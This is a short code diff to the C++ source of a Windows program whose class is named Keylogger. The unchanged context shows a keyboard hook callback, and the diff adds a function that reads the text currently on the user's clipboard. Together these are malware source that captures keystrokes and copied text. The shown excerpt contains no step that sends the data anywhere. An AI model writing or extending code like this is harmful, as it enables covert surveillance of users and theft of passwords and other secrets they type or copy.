@@ -58,3 +58,25 @@ LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
 
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
+
+std::wstring GetClipboardText() {
+    if (!OpenClipboard(nullptr)) {
+        return L"";
+    }
+
+    std::wstring text;
+
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData != nullptr) {
+        // hData is a handle, need the pointer:
+        wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
+        if (pszText != nullptr) {
+            text = pszText;
+            GlobalUnlock(hData);
+        }
+    }
+
+    CloseClipboard();
+
+    return text;
+}
